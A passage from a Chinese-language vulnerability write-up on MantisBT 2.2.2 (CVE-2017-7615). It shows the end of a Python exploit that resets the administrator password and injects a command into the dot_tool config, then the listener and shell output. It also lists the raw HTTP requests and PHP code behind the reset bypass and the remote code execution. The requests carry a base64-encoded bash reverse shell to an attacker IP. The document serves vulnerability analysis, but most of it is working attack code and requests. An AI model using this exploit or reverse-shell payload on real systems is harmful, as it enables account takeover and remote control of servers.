                    <span class="n">cleanup_dict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'config_option'</span><span class="p">:</span> <span class="n">config</span><span class="p">})</span>
                    <span class="n">cleanup_dict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'adm_config_delete_token'</span><span class="p">:</span>
                                             <span class="n">test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'name="adm_config_delete_token" value='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]})</span>
                    <span class="n">cleanup_dict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'user_id'</span><span class="p">:</span> <span class="n">test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'name="user_id" value='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]})</span>
                    <span class="n">cleanup_dict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">'project_id'</span><span class="p">:</span> <span class="n">test</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'name="project_id" value='</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]})</span>

            <span class="c1"># Delete the config</span>
            <span class="k">print</span> <span class="s2">"Deleting the "</span> <span class="o">+</span> <span class="n">config</span> <span class="o">+</span> <span class="s2">" config."</span>

            <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s2">"/adm_config_delete.php"</span>
            <span class="n">data</span> <span class="o">=</span> <span class="s2">"adm_config_delete_token="</span> <span class="o">+</span> <span class="n">cleanup_dict</span><span class="p">[</span><span class="s1">'adm_config_delete_token'</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"&amp;user_id="</span> <span class="o">+</span> <span class="n">cleanup_dict</span><span class="p">[</span>
                <span class="s1">'user_id'</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"&amp;project_id="</span> <span class="o">+</span> <span class="n">cleanup_dict</span><span class="p">[</span><span class="s1">'project_id'</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"&amp;config_option="</span> <span class="o">+</span> <span class="n">cleanup_dict</span><span class="p">[</span>
                       <span class="s1">'config_option'</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"&amp;_confirmed=1"</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">cleanup</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">CleanupHeaders</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

            <span class="c1"># Confirm if actually cleaned up</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">cleanup</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="s2">"http://"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RHOST</span> <span class="o">+</span> <span class="s2">":"</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">RPORT</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">mantisLoc</span> <span class="o">+</span> <span class="s2">"/adm_config_report.php"</span><span class="p">,</span>
                            <span class="n">headers</span><span class="o">=</span><span class="n">CleanupHeaders</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">config</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
                <span class="n">cleaned_up</span> <span class="o">=</span> <span class="bp">False</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">cleaned_up</span> <span class="o">=</span> <span class="bp">True</span>

        <span class="k">if</span> <span class="n">cleaned_up</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">print</span> <span class="s2">"Successfully cleaned up"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s2">"Unable to clean up configs"</span>


<span class="n">exploit</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">()</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">reset_login</span><span class="p">()</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">login</span><span class="p">()</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">CreateConfigOption</span><span class="p">(</span><span class="n">option</span><span class="o">=</span><span class="s2">"relationship_graph_enable"</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="s2">"1"</span><span class="p">)</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">CreateConfigOption</span><span class="p">(</span><span class="n">option</span><span class="o">=</span><span class="s2">"dot_tool"</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="n">exploit</span><span class="o">.</span><span class="n">ReverseShell</span> <span class="o">+</span> <span class="s1">';'</span><span class="p">)</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">TriggerExploit</span><span class="p">()</span>
<span class="n">exploit</span><span class="o">.</span><span class="n">Cleanup</span><span class="p">()</span>
</pre></div>
<p>我在我的攻击机上开展监听</p>
<div class="highlight"><pre><span></span>╰─$ nc -lvvp <span class="m">4444</span> -n
Listening on <span class="m">0</span>.0.0.0 <span class="m">4444</span>
</pre></div>
<p>更改exp当中的攻击机ip,目标ip,mantisLoc等信息后，执行exp</p>
<div class="highlight"><pre><span></span>╰─$ python CVE-2017-7615_exp.py
Successfully hijacked account!
Successfully logged in!
Triggering reverse shell
Cleaning up
Deleting the dot_tool config.
Deleting the relationship_graph_enable config.
Successfully cleaned up
</pre></div>
<p>成功接受回连获取shell</p>
<div class="highlight"><pre><span></span>╰─$ nc -lvvp <span class="m">4444</span> -n                                                                                                    <span class="m">130</span> ↵
Listening on <span class="m">0</span>.0.0.0 <span class="m">4444</span>
Connection received on <span class="m">172</span>.17.0.4 <span class="m">40698</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span><span class="m">12522</span><span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@21467ebf0ffb:/var/www/html/mantisbt-2.2.2$ id
id
<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
</pre></div>
<h2 data-content="1" id="08f76a89bfbf155766addff5d36a157b">密码重置漏洞分析</h2>
<p>exp中可以看到包含了一个密码重置漏洞和一个认证后的RCE漏洞，由于是个老洞了分析整套的利用修复具体逻辑没有太大意义，因此只分析一下漏洞原理</p>
<p>重置密码的两个数据包</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/mantisbt-2.2.2/verify.php?id=1&amp;confirm_hash=</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/account_update.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=49copvvmkmrpp014hv2255cup3</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">145</span>

account_update_token=20220727yZ-LSS6H7Oh2T8e0vtB-7idGE-jtqpkN&amp;password=password&amp;verify_user_id=1&amp;realname=administrator&amp;password_confirm=password
</pre></div>
<p>第一个包是为了获取account_update_token的参数值，打开verify.php进行分析</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="o">........</span>
<span class="nv">$f_user_id</span> <span class="o">=</span> <span class="nx">gpc_get_string</span><span class="p">(</span> <span class="s1">'id'</span> <span class="p">);</span>
<span class="nv">$f_confirm_hash</span> <span class="o">=</span> <span class="nx">gpc_get_string</span><span class="p">(</span> <span class="s1">'confirm_hash'</span> <span class="p">);</span>
<span class="o">......</span>
<span class="nv">$t_token_confirm_hash</span> <span class="o">=</span> <span class="nx">token_get_value</span><span class="p">(</span> <span class="nx">TOKEN_ACCOUNT_ACTIVATION</span><span class="p">,</span> <span class="nv">$f_user_id</span> <span class="p">);</span>

<span class="k">if</span><span class="p">(</span> <span class="nv">$f_confirm_hash</span> <span class="o">!=</span> <span class="nv">$t_token_confirm_hash</span> <span class="p">)</span> <span class="p">{</span>
    <span class="nb">trigger_error</span><span class="p">(</span> <span class="nx">ERROR_LOST_PASSWORD_CONFIRM_HASH_INVALID</span><span class="p">,</span> <span class="nx">ERROR</span> <span class="p">);</span>
<span class="p">}</span>

<span class="nx">user_reset_failed_login_count_to_zero</span><span class="p">(</span> <span class="nv">$f_user_id</span> <span class="p">);</span>
<span class="nx">user_reset_lost_password_in_progress_count_to_zero</span><span class="p">(</span> <span class="nv">$f_user_id</span> <span class="p">);</span>

<span class="c1"># fake login so the user can set their password</span>
<span class="nx">auth_attempt_script_login</span><span class="p">(</span> <span class="nx">user_get_field</span><span class="p">(</span> <span class="nv">$f_user_id</span><span class="p">,</span> <span class="s1">'username'</span> <span class="p">)</span> <span class="p">);</span>

<span class="nx">user_increment_login_count</span><span class="p">(</span> <span class="nv">$f_user_id</span> <span class="p">);</span>


<span class="c1"># extracts the user information</span>
<span class="c1"># and prefixes it with u_</span>
<span class="nv">$t_row</span> <span class="o">=</span> <span class="nx">user_get_row</span><span class="p">(</span> <span class="nv">$f_user_id</span> <span class="p">);</span>

<span class="nb">extract</span><span class="p">(</span> <span class="nv">$t_row</span><span class="p">,</span> <span class="nx">EXTR_PREFIX_ALL</span><span class="p">,</span> <span class="s1">'u'</span> <span class="p">);</span>

<span class="nv">$t_can_change_password</span> <span class="o">=</span> <span class="nx">helper_call_custom_function</span><span class="p">(</span> <span class="s1">'auth_can_change_password'</span><span class="p">,</span> <span class="k">array</span><span class="p">()</span> <span class="p">);</span>

<span class="nx">layout_login_page_begin</span><span class="p">();</span>
<span class="o">......</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>可以看到头部在做的就是从query数据中取出id和confirm_hash参数值，然后将id值传入token_get_value</p>
<div class="highlight"><pre><span></span><span class="x">/**</span>
<span class="x"> * Get a token's value or null if not found</span>
<span class="x"> * @param integer $p_type    The token type to retrieve.</span>
<span class="x"> * @param integer $p_user_id The user identifier (null for current user).</span>
<span class="x"> * @return array Token row</span>
<span class="x"> */</span>
<span class="x">function token_get_value( $p_type, $p_user_id = null ) {</span>
<span class="x">    $t_token = token_get( $p_type, $p_user_id );</span>

<span class="x">    if( null !== $t_token ) {</span>
<span class="x">        return $t_token['value'];</span>
<span class="x">    }</span>

<span class="x">    return null;</span>
<span class="x">}</span>
</pre></div>
<p>经过动态调试跟踪发现最终是运行以下命令获取token值</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">mantis222_tokens_table222</span> <span class="k">WHERE</span> <span class="k">type</span><span class="o">=?</span> <span class="k">AND</span> <span class="k">owner</span><span class="o">=?</span><span class="p">;</span>
</pre></div>
<p>这个值在登陆后才会有值，当我们没有登录的情况下是空的，因此返回null</p>
<p>因此verify.php继续向下运行</p>
<div class="highlight"><pre><span></span><span class="x">.......</span>
<span class="x">if( $f_confirm_hash != $t_token_confirm_hash ) {</span>
<span class="x">    trigger_error( ERROR_LOST_PASSWORD_CONFIRM_HASH_INVALID, ERROR );</span>
<span class="x">}</span>
<span class="x">......</span>
</pre></div>
<p>就不会触发本应触发的错误，导致此处的校验绕过，继续向下运行到<code>auth_attempt_script_login( user_get_field( $f_user_id, 'username' ) );</code>,会调用user_get_field函数,user_get_field中会将用户id传入user_get_row函数，user_get_row函数又会进一步调用user_cache_row函数</p>
<div class="highlight"><pre><span></span><span class="x">function user_cache_row( $p_user_id, $p_trigger_errors = true ) {</span>
<span class="x">    global $g_cache_user;</span>

<span class="x">    $c_user_id = (int)$p_user_id;</span>

<span class="x">    if( !isset( $g_cache_user[$c_user_id] ) ) {</span>
<span class="x">        user_cache_array_rows( array( $c_user_id ) );</span>
<span class="x">    }</span>

<span class="x">    $t_user_row = $g_cache_user[$c_user_id];</span>

<span class="x">    if( !$t_user_row ) {</span>
<span class="x">        if( $p_trigger_errors ) {</span>
<span class="x">            error_parameters( (integer)$p_user_id );</span>
<span class="x">            trigger_error( ERROR_USER_BY_ID_NOT_FOUND, ERROR );</span>
<span class="x">        }</span>

<span class="x">        return false;</span>
<span class="x">    }</span>

<span class="x">    return $t_user_row;</span>
<span class="x">}</span>
</pre></div>
<p>此处会从数据库中取出现有的用户信息存入$g_cache_user当中，然后根据$c_user_id（request传入的id值），来获取相应的用户信息$t_user_row。但是如果没有取到有效的$t_user_row值，就会触发错误</p>
<p>此处也能解释在第一个数据包中的id值为什么须为1，因为用户中至少存在一个administrator,ID值为1则有效，如果没有添加其他用户的情况下，request传入除了1以外的值就会触发错误。</p>
<p>继续向下运行加载前端界面，内嵌一行php</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
                    <span class="k">echo</span> <span class="nx">form_security_field</span><span class="p">(</span> <span class="s1">'account_update'</span> <span class="p">);</span>
                    <span class="c1"># When verifying account, set a token and don't display current password</span>
                    <span class="nx">token_set</span><span class="p">(</span> <span class="nx">TOKEN_ACCOUNT_VERIFY</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="nx">TOKEN_EXPIRY_AUTHENTICATED</span><span class="p">,</span> <span class="nv">$u_id</span> <span class="p">);</span>
                    <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这行则会加载我们需要用的有效的account_update_key并返回给用户</p>
<p>然后研究第二个数据包</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/account_update.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=49copvvmkmrpp014hv2255cup3</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">145</span>

account_update_token=20220727yZ-LSS6H7Oh2T8e0vtB-7idGE-jtqpkN&amp;password=password&amp;verify_user_id=1&amp;realname=administrator&amp;password_confirm=password
</pre></div>
<p>进去分析account_update.php</p>
<p>头部存在代码</p>
<p><code>form_security_validate( 'account_update' );</code></p>
<p>会检查输入的session与account_update是否匹配，如果没有有效的token则会报错推出</p>
<p>否则会继续向下运行，做一些参数校验工作，然后调用方法user_set_password来重置口令,user_set_password方法会整合所有参数组合为以下sql语句执行：</p>
<p><code>UPDATE mantis222_user_table222                 SET password=root, cookie_string=XFf3oXAaubj6XafrescDZ702IJeWIA1kecS7KoKvqFge_skYnK2QPVHR6Im5FXcq               WHERE id=1</code></p>
<p>完成管理员密码的重置</p>
<h2 data-content="1" id="dd24d6dd967cce1f3247bb819136850c">认证后命令执行漏洞分析</h2>
<p>认证后RCE关键是这四个数据包，登陆后获取有效cookie，然后请求<code>adm_config_report.php</code>可以获取有效的adm_config_set_token值</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/mantisbt-2.2.2/adm_config_report.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=u2cr4957le1oe6etkdrd734s70</span>
</pre></div>
<p>然后请求adm_config_set.php，config_option参数为relationship_graph_enable</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/adm_config_set.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=3ed30cul6f19sr0v49d9l5vs33</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">257</span>

adm_config_set_token=20220728agSFMyTMhprSgtlLxXdhye0ejxWCxE1W&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=relationship_graph_enable&amp;original_config_option=&amp;type=0&amp;value=1&amp;action=create&amp;config_set=Create+Configuration+Option
</pre></div>
<p>进而继续请求adm_config_set.php，config_option参数变为dot_tool，value参数重为我们要执行的命令<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTEzLjE2MC80NDQ0IDA+JjE= | base64 -d | /bin/bash;</code></p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/adm_config_set.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=5aka0muqtf70qs0cbgk004r8g6</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">345</span>

adm_config_set_token=20220728IEIong_N4C3T2y434vmOxnPFjVz8oKB9&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=dot_tool&amp;original_config_option=&amp;type=0&amp;value=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTYuMTEzLjE2MC80NDQ0IDA%2BJjE%3D+%7C+base64+-d+%7C+%2Fbin%2Fbash%3B&amp;action=create&amp;config_set=Create+Configuration+Option
</pre></div>
<p>最后再调用workflow_graph_img.php，触发写入的命令</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/mantisbt-2.2.2/workflow_graph_img.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=3ed30cul6f19sr0v49d9l5vs33</span>
</pre></div>
<p>进入adm_config_set.php开展分析</p>
<p>同样，开头调用form_security_validate( 'adm_config_set' );要求必须要有一个有效的adm_config_set值，最后调用config_set( $f_config_option, $t_value, $f_user_id, $f_project_id )设置相应的参数</p>
<p>仔细分析一下第二个包最后的结果：</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/adm_config_set.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=3ed30cul6f19sr0v49d9l5vs33</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">257</span>

adm_config_set_token=20220728agSFMyTMhprSgtlLxXdhye0ejxWCxE1W&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=relationship_graph_enable&amp;original_config_option=&amp;type=0&amp;value=1&amp;action=create&amp;config_set=Create+Configuration+Option
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172918-c11078fc-0e57-1.png"/></p>
<p>执行的命令为</p>
<div class="highlight"><pre><span></span><span class="k">UPDATE</span> <span class="n">mantis222_config_table222</span>                    <span class="kt">SET</span> <span class="n">value</span><span class="o">=</span><span class="s2">"1"</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">access_reqd</span><span class="o">=</span><span class="mi">90</span>                   <span class="k">WHERE</span> <span class="n">config_id</span> <span class="o">=</span> <span class="n">relationship_graph_enable</span> <span class="k">AND</span>                     <span class="n">project_id</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">AND</span>                      <span class="n">user_id</span> <span class="o">=</span> <span class="mi">0</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172947-d2cbceca-0e57-1.png"/></p>
<p>再分析第三个数据包</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/mantisbt-2.2.2/adm_config_set.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=5aka0muqtf70qs0cbgk004r8g6</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">345</span>

adm_config_set_token=20220728IEIong_N4C3T2y434vmOxnPFjVz8oKB9&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=dot_tool&amp;original_config_option=&amp;type=0&amp;value=echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNzIuMTYuMTEzLjE2MC80NDQ0IDA%2BJjE%3D+%7C+base64+-d+%7C+%2Fbin%2Fbash%3B&amp;action=create&amp;config_set=Create+Configuration+Option
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220728172958-d8dda61c-0e57-1.png"/></p>
<p>执行的命令</p>
<div class="highlight"><pre><span></span><span class="k">UPDATE</span> <span class="n">mantis222_config_table222</span>                    <span class="kt">SET</span> <span class="n">value</span><span class="o">=</span><span class="s2">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMTEzLjE2MC80NDQ0IDA+JjE= | base64 -d | /bin/bash;"</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">access_reqd</span><span class="o">=</span><span class="mi">90</span>                  <span class="k">WHERE</span> <span class="n">config_id</span> <span class="o">=</span> <span class="s2">"dot_tool"</span> <span class="k">AND</span>                        <span class="n">project_id</span> <span class="o">=</span> <span class="mi">0</span> <span class="k">AND</span>                      <span class="n">user_id</span> <span class="o">=</span> <span class="mi">0</span>
</pre></div>
<p><img src="Mantis BT分析.assets/Screen Shot 2022-07-28 at 4.53.53 PM.png"/></p>
<p>可以看到，配置的数据库中dot_tool的value值被设置为我们要执行的命令</p>
<p>继续分析第四个数据包</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/mantisbt-2.2.2/workflow_graph_img.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">172.16.113.160:10080</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">python-requests/2.24.0</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">MANTIS_secure_session=1; MANTIS_STRING_COOKIE=0xHUTDS51L2uETGn_LoM_abe3BCUSEUs0nBph9AiGC6UrpleMyZ0VFhf_HUshQc5; PHPSESSID=3ed30cul6f19sr0v49d9l5vs33</span>
</pre></div>
<p>分析一下workflow_graph_img.php</p>
<div class="highlight"><pre><span></span><span class="x">......</span>
<span class="x">$t_dot_tool = config_get( 'dot_tool' );</span>
<span class="x">......</span>
<span class="x">$t_graph = new Graph( 'workflow', $t_graph_attributes, $t_dot_tool );</span>

<span class="x">$t_graph-&gt;set_default_node_attr( array ( 'fontname' =&gt; $t_graph_fontname,</span>
<span class="x">                                         'fontsize' =&gt; $t_graph_fontsize,</span>
<span class="x">                                         'shape'    =&gt; 'record',</span>
<span class="x">                                         'style'    =&gt; 'filled',</span>
<span class="x">                                         'height'   =&gt; '0.2',</span>
<span class="x">                                         'width'    =&gt; '0.4' ) );</span>

<span class="x">$t_graph-&gt;set_default_edge_attr( array ( 'style' =&gt; 'solid',</span>
<span class="x">                                         'color' =&gt; '#0000C0',</span>
<span class="x">                                         'dir'   =&gt; 'forward' ) );</span>

<span class="x">foreach ( $t_status_arr as $t_from_status =&gt; $t_from_label ) {</span>
<span class="x">    $t_enum_status = MantisEnum::getAssocArrayIndexedByValues( config_get( 'status_enum_string' ) );</span>
<span class="x">    foreach ( $t_enum_status as $t_to_status_id =&gt; $t_to_status_label ) {</span>
